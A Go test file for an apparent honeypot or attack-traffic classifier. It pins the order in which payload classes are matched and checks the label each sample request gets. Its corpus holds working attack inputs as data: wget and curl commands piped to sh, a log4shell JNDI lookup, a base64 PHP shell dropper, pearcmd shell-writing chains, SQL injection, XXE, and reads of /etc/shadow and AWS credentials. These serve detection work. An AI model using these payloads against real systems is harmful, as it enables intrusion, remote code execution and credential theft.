package main

import (
	"reflect"
	"strings"
	"testing"
)

// This file is the proof behind #3464's refactor: the classifiers moved out
// of main.go into one file per CVE, and the thing that had to survive the move
// is not "it still compiles" but "the same payload still reaches the same
// case".
//
// Why the order is a real invariant rather than a tidiness concern: the
// dispatch is first-match-wins, and several classes are deliberately
// overlapping. A php-base64 dropper is also php-code. A WordPress pagename
// traversal into pearcmd is also a pearcmd chain. A Roundcube login carrying
// SQL is also the generic sqli class. Which of those gets the event is a
// statement about what the attacker did, so moving a case up or down the list
// does not shuffle some labels around -- it silently relabels the class, and
// a test that only checks "some label came back" cannot see it.
//
// The existing tests pin each class in its own file (payload_test.go,
// roundcube_sqli_test.go, ollure_coverage_3394_test.go,
// odata_double_encode_test.go, scanner_laundering_3430_test.go,
// wordpress_template_inclusion_test.go) and pin several precedences
// incidentally. They do not pin the order itself, and four classes had no
// coverage through classifyPayload at all: jndi-lookup, xxe,
// template-injection and info-disclosure. So this file adds the two things
// that were missing rather than restating what those files already say:
//
//   - TestPayloadClassOrderIsPinned: the whole order, as data.
//   - TestClassifyPayloadReachesOneClassPerPayload: one payload per class.
//   - TestClassifyPayloadFirstMatchWins: payloads that match more than one
//     class, asserted against the specific one.
//   - TestClassifyPayloadCorpusCoversEveryDispatchClass: the two tables above
//     reach every class, so the next CVE cannot be added to the dispatch and
//     left untested without this file going red.
//
// Everything else in the package still runs unchanged. This file adds no
// behaviour.

// Rebased onto main, this table and the order below moved with it, and the
// moves are the point of the exercise rather than a chore around it:
//
//   - main added CVE-2026-87902's second reading, #3449's
//     wordpress-template-inclusion, at position 4 -- after
//     wordpress-pagename-traversal and before pearcmd-rce, which is where the
//     switch put it. It is a class, so it is in both tables below: one payload
//     of its own, and the four overlaps that decide whether it may take
//     traffic the classes around it already own.
//   - #3449 also refactored the pagename case onto shared formValues and
//     decodeUpTo helpers so that a semicolon in a `data://` value does not
//     make the parameter invisible. That rewrite moved with the case into
//     classify_wordpress.go; the corpus replay is what proves the case labels
//     the same shapes it did before the move.
//   - the refactor had put teamcity-agent-deserialization first and
//     roundcube-virtuser-query-sqli second. main has them the other way round,
//     and the two do not currently share a payload, so the swap changed no
//     label -- but it was still a change to a first-match-wins list, and the
//     order below is main's order rather than the refactor's.

// classifyOrderCase is one request and the payload_class it must produce.
// want is the class's label, which is also the identity of the case: every
// label in the dispatch is distinct, so "which class won" and "which label
// came back" are the same question.
type classifyOrderCase struct {
	name, query, body, want string
}

// classifyOrderCorpus holds one representative payload per class, in dispatch
// order, plus the two shapes that must stay unlabelled.
var classifyOrderCorpus = []classifyOrderCase{
	{
		name: "roundcube virtuser_query pre-auth sqli",
		body: `_task=login&_user=%27%20or%201%3D1--`,
		want: "roundcube-virtuser-query-sqli",
	},
	{
		// One row so the enumeration covers every class in the dispatch.
		// The boundary that case actually turns on -- a TeamCity container
		// winning against the generic serialized-object case, and losing to
		// it without the product half -- is already pinned from both sides in
		// teamcity_deser_test.go, and every positive case there is itself an
		// ordering test: move the entry below serialized-object and they all
		// fail. Duplicating them here would only be a second copy to keep in
		// step.
		name: "teamcity agent registration poll carrying a base64 stream",
		body: `<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>xmlrpc/allowRegistration</methodName>` +
			`<params><param><value><string>rO0ABXNyABNvcmcuYXBhY2hlLmNvbW1vbnN0AAtUcmFuc2Zvcm1lcnAAAAAA` +
			`</string></value></param></params></methodCall>`,
		want: "teamcity-agent-deserialization",
	},
	{
		name:  "wordpress pagename double-encoded traversal",
		query: `page_id=2&pagename=%252e%252e%252fwp-config`,
		want:  "wordpress-pagename-traversal",
	},
	{
		// #3449's half of CVE-2026-87902: a PHP stream wrapper in a template
		// selector, with the WordPress routing variable the CVE's PoC needs
		// beside it. Position 4, so it is claimed before secret-read would
		// have called this an ordinary credential read.
		name:  "wordpress template inclusion through a php stream wrapper",
		query: `page_id=2&theme=php://filter/convert.base64-encode/resource=/etc/passwd`,
		want:  "wordpress-template-inclusion",
	},
	{
		name:  "php-cgi argument injection",
		query: `-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`,
		want:  "php-cgi-argument-injection",
	},
	{
		name:  "thinkphp invokefunction",
		query: `s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5`,
		want:  "thinkphp-rce",
	},
	{
		name:  "pearcmd config-create",
		query: `lang=../../../../usr/local/lib/php/pearcmd&+config-create+/`,
		want:  "pearcmd-rce",
	},
	{
		name: "log4shell jndi lookup",
		body: `${jndi:ldap://203.0.113.9/a}`,
		want: "jndi-lookup",
	},
	{
		name: "php base64 shell dropper",
		body: `<?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBzaA=="));`,
		want: "php-base64-shell",
	},
	{
		name: "php code in the body",
		body: `<?php echo(md5("Hello PHPUnit"));`,
		want: "php-code",
	},
	{
		name: "wget piped to sh",
		body: `(wget -qO- https://203.0.113.9/s) | sh -s apache`,
		want: "downloader",
	},
	{
		name:  "command through cmd=",
		query: `cmd=cat%20/etc/hosts`,
		want:  "command-injection",
	},
	{
		name:  "credential file read by path",
		query: `file=/etc/shadow`,
		want:  "secret-read",
	},
	{
		name:  "traversal on its own",
		query: `file=../../etc/hosts`,
		want:  "path-traversal",
	},
	{
		name: "ollama model name used as a network target",
		body: `{"name":"http://169.254.169.254/latest/meta-data"}`,
		want: "ollama-model-target",
	},
	{
		name: "administrator account creation",
		body: `{"Name":"lan test","RoleId":"Administrator","Enabled":true}`,
		want: "admin-account-create",
	},
	{
		name:  "odata option still percent-encoded",
		query: `$filter=name%2520eq%2520'a'`,
		want:  "odata-double-encode-probe",
	},
	{
		name: "generic sql injection",
		body: `id=1' or 1=1--`,
		want: "sqli",
	},
	{
		name: "prototype pollution",
		body: `{"then":"$1:__proto__:then"}`,
		want: "prototype-pollution",
	},
	{
		name: "xml external entity",
		body: `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>`,
		want: "xxe",
	},
	{
		name: "template expression with something to evaluate",
		body: `{{7*7}}`,
		want: "template-injection",
	},
	{
		name: "onvif soap probe",
		body: `<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope"/>`,
		want: "soap-probe",
	},
	{
		name: "vpn handshake at a web port",
		body: `<config-auth client="vpn" type="init">`,
		want: "vpn-handshake",
	},
	{
		name: "mcp handshake",
		body: `{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2025-03-26"}}`,
		want: "mcp-probe",
	},
	{
		name: "mining rpc probe",
		body: `{"id":1,"method":"eth_getWork","params":[]}`,
		want: "mining-rpc-probe",
	},
	{
		name: "wordpress batch multiplexer",
		body: `{"requests":[{"method":"GET","path":"/wp/v2/posts"}]}`,
		want: "batch-request-probe",
	},
	{
		name:  "dns chaos query at an http port",
		query: `version.bind`,
		want:  "dns-version-probe",
	},
	{
		name:  "bare hostname as the whole query",
		query: `ip.parrotdns.com`,
		want:  "open-resolver-probe",
	},
	{
		name:  "androxgh0st marker",
		query: `0x%5B%5D=androxgh0st`,
		want:  "androxgh0st",
	},
	{
		name:  "wordpress rest enumeration",
		query: `rest_route=/gravitysmtp/v1/tests/mock-data`,
		want:  "wordpress-rest-probe",
	},
	{
		name:  "phpinfo in the query",
		query: `phpinfo=1`,
		want:  "info-disclosure",
	},
	{
		name: "multipart padding",
		body: "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"junk\"\n\n" +
			strings.Repeat("A", 64),
		want: "multipart-padding",
	},
	{
		name: "java serialized stream as base64 text",
		body: `rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcA`,
		want: "serialized-object",
	},
	{
		name: "binary protocol that is still valid utf-8",
		body: "\x00\x00\x00\x00\x03:\x01*",
		want: "binary-protocol",
	},
	// The tail. A class that is not in the dispatch is not "a class we have
	// not written yet", it is the decision to leave the traffic unlabelled,
	// so it is pinned here like any other answer.
	{
		name:  "ordinary query stays unlabelled",
		query: `format=json&page=2`,
		want:  "",
	},
	{
		name: "ordinary body stays unlabelled",
		body: `{"username":"alice","remember":true}`,
		want: "",
	},
}

// classifyPrecedenceCorpus holds payloads that satisfy more than one case.
// Each want is the SPECIFIC class: these are the rows that fail if the
// dispatch is reordered, because a payload that only matched one case would
// keep its label no matter where it sits.
var classifyPrecedenceCorpus = []classifyOrderCase{
	{
		name: "jndi inside php beats the bare php class",
		body: `<?php echo("${jndi:ldap://203.0.113.9/a}");`,
		want: "jndi-lookup",
	},
	{
		name: "base64 shell beats the bare php class",
		body: `<?php system(base64_decode("Y2QgL3RtcCB8fCBzaA=="));`,
		want: "php-base64-shell",
	},
	{
		name: "php code beats template injection",
		body: `<?php echo("{{7*7}}");`,
		want: "php-code",
	},
	{
		name: "php code beats xxe",
		body: `<?php echo(readfile("php://input")); /* <!ENTITY x SYSTEM "file:///etc/passwd"> */`,
		want: "php-code",
	},
	{
		name: "roundcube gate beats the generic sqli class",
		body: `_task=login&_user=x' or 1=1--`,
		want: "roundcube-virtuser-query-sqli",
	},
	{
		name: "pagename traversal beats its own second stage",
		query: `page_id=2&pagename=%252e%252e%252fusr%252flocal%252flib%252fphp%252fpearcmd` +
			`&+config-create+/&/<?=phpinfo()?>+/tmp/x.php`,
		want: "wordpress-pagename-traversal",
	},
	{
		// #3449's case matches this one too -- the value is a template
		// selector and page_id is a WordPress signal -- so position 4 is what
		// keeps #3359's label where it has been since it shipped.
		name:  "pagename traversal beats template inclusion on the same bytes",
		query: `page_id=2&pagename=%252e%252e%252fwp-config`,
		want:  "wordpress-pagename-traversal",
	},
	{
		// A WordPress request whose template selector carries the PEAR
		// argv. The advisory's verified PoC splits it: routing in the form
		// body, argv in the raw query, because PHP splits the query on a
		// literal '+' without decoding. pearcmd-rce needs both markers in
		// the query and never sees them, so the class above it is the only
		// thing that can name this.
		name:  "template inclusion claims a pearcmd argv split across query and body",
		query: `page_id=2&+config-create+/&/<?=system('id')?>+/tmp/x.php`,
		body:  `pagename=/wp-content/themes/a/t.php`,
		want:  "wordpress-template-inclusion",
	},
	{
		// The stricter half of the gate. A wrapper in `pagename` with no
		// second WordPress signal is somebody else's LFI and keeps the class
		// it always had, rather than being guessed into a CVE.
		name:  "a bare pagename wrapper with no WordPress signal is not this class",
		query: `pagename=php://filter/resource=/etc/passwd`,
		want:  "secret-read",
	},
	{
		name:  "a generic LFI aimed anywhere else keeps its own class",
		query: `file=php://filter/resource=/etc/passwd`,
		want:  "secret-read",
	},
	{
		name:  "pearcmd chain beats plain traversal",
		query: `lang=../../../../usr/local/lib/php/pearcmd&+config-create+/`,
		want:  "pearcmd-rce",
	},
	{
		name: "downloader beats command injection",
		body: `curl -sk https://203.0.113.9/s | sh; wget -qO- https://203.0.113.9/t`,
		want: "downloader",
	},
	{
		name:  "command injection beats secret-read",
		query: `cmd=cat%20/root/.aws/credentials`,
		want:  "command-injection",
	},
	{
		name:  "secret-read beats plain traversal",
		query: `file=../../etc/shadow`,
		want:  "secret-read",
	},
	{
		name: "traversal beats an ollama target on the same bytes",
		body: `{"name":"http://127.0.0.1:9090/../../x"}`,
		want: "path-traversal",
	},
	{
		name: "admin account creation beats the generic sqli class",
		body: `{"RoleId":"Administrator","q":"1' or 1=1--"}`,
		want: "admin-account-create",
	},
	{
		name: "odata residue beats the generic sqli class",
		body: `$filter=1' or 1=1%2520`,
		want: "odata-double-encode-probe",
	},
	{
		name: "mcp handshake beats the batch multiplexer",
		body: `{"jsonrpc":"2.0","initialize":1,"protocolVersion":"2025-03-26","requests":[{"path":"/x"}]}`,
		want: "mcp-probe",
	},
	{
		name: "mining rpc beats the batch multiplexer",
		body: `{"method":"eth_getWork","requests":[]}`,
		want: "mining-rpc-probe",
	},
	{
		name:  "version.bind is also a bare hostname, and the dns class wins",
		query: `version.bind`,
		want:  "dns-version-probe",
	},
	{
		name:  "open resolver beats the androxgh0st marker",
		query: `androxgh0st.example.com`,
		want:  "open-resolver-probe",
	},
	{
		name:  "wordpress rest enumeration beats phpinfo",
		query: `rest_route=/wp/v2/users&phpinfo=1`,
		want:  "wordpress-rest-probe",
	},
	{
		name: "prototype pollution beats multipart padding",
		body: "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"a\"\n\n" +
			`{"x":"__proto__"}` + strings.Repeat("A", 64),
		want: "prototype-pollution",
	},
	{
		name: "serialized object beats the binary-protocol fallback",
		body: "rO0AB\xac\xed\x00\x05\x73\x72",
		want: "serialized-object",
	},
}

// wantPayloadClassOrder is the dispatch as data. #3464 moved the cases out of
// main.go into one file per CVE, which turns "did the rebase put this case on
// the right side of serialized-object" from a thing a merge tool gets wrong
// silently into a thing this test refuses to accept.
var wantPayloadClassOrder = []string{
	"roundcube-virtuser-query-sqli",
	"teamcity-agent-deserialization",
	"wordpress-pagename-traversal",
	"wordpress-template-inclusion",
	"php-cgi-argument-injection",
	"thinkphp-rce",
	"pearcmd-rce",
	"jndi-lookup",
	"php-base64-shell",
	"php-code",
	"downloader",
	"command-injection",
	"secret-read",
	"path-traversal",
	"ollama-model-target",
	"admin-account-create",
	"odata-double-encode-probe",
	"sqli",
	"prototype-pollution",
	"xxe",
	"template-injection",
	"soap-probe",
	"vpn-handshake",
	"mcp-probe",
	"mining-rpc-probe",
	"batch-request-probe",
	"dns-version-probe",
	"open-resolver-probe",
	"androxgh0st",
	"wordpress-rest-probe",
	"info-disclosure",
	"multipart-padding",
	"serialized-object",
	"binary-protocol",
}

// TestPayloadClassOrderIsPinned compares the dispatch against the order
// above, position by position. Nothing else in the package would notice a case
// being moved: each case is independently correct, and the only thing that
// changes when two of them swap is which one wins a payload they both match.
func TestPayloadClassOrderIsPinned(t *testing.T) {
	got := make([]string, 0, len(payloadClasses))
	seen := map[string]bool{}
	for i, c := range payloadClasses {
		if c.match == nil {
			t.Errorf("class %d (%q) has no predicate: the first request would panic", i, c.label)
		}
		if seen[c.label] {
			t.Errorf("class %d repeats label %q: two cases with one label cannot be told apart in a log", i, c.label)
		}
		seen[c.label] = true
		got = append(got, c.label)
	}

	if !reflect.DeepEqual(got, wantPayloadClassOrder) {
		t.Fatalf("dispatch order changed.\n got: %v\nwant: %v", got, wantPayloadClassOrder)
	}
}

// TestClassifyPayloadReachesOneClassPerPayload runs the corpus: one payload
// per class, so a case that stopped matching -- renamed, dropped, or wired to
// the wrong predicate -- fails here even if every other class still works.
func TestClassifyPayloadReachesOneClassPerPayload(t *testing.T) {
	for _, c := range classifyOrderCorpus {
		t.Run(c.name, func(t *testing.T) {
			if got := classifyPayload(c.query, c.body); got != c.want {
				t.Fatalf("classifyPayload(%q, %q) = %q, want %q", c.query, c.body, got, c.want)
			}
		})
	}
}

// TestClassifyPayloadFirstMatchWins is the ordering proof proper. Every row
// here matches at least two classes; the assertion is that the more specific
// one is first. A refactor that transposes two entries, or that inserts a new
// class above a generic one, breaks a row in this table.
func TestClassifyPayloadFirstMatchWins(t *testing.T) {
	for _, c := range classifyPrecedenceCorpus {
		t.Run(c.name, func(t *testing.T) {
			if got := classifyPayload(c.query, c.body); got != c.want {
				t.Fatalf("classifyPayload(%q, %q) = %q, want %q", c.query, c.body, got, c.want)
			}
		})
	}
}

// TestClassifyPayloadCorpusCoversEveryDispatchClass closes the loop that makes
// this file go stale. The order above and the two tables are three separate
// lists, and a rebase that adds a class to the dispatch has to touch all
// three; nothing forced it to. This does: every label in the dispatch has to
// be reached by at least one row of the per-class corpus, so a class that
// lands with no representative payload fails here rather than sitting
// untested until the next refactor.
//
// The reverse direction is deliberately NOT required. A class with only a
// precedence row is already pinned on the more valuable side -- the payload
// that decides its position -- and a payload that only reaches one class tells
// this file nothing the class's own test does not.
func TestClassifyPayloadCorpusCoversEveryDispatchClass(t *testing.T) {
	covered := map[string]bool{}
	for _, c := range classifyOrderCorpus {
		covered[classifyPayload(c.query, c.body)] = true
	}
	for _, p := range payloadClasses {
		if !covered[p.label] {
			t.Errorf("class %q has no row in classifyOrderCorpus: add one representative payload, "+
				"or the class is only ever exercised by the overlaps above", p.label)
		}
	}
}
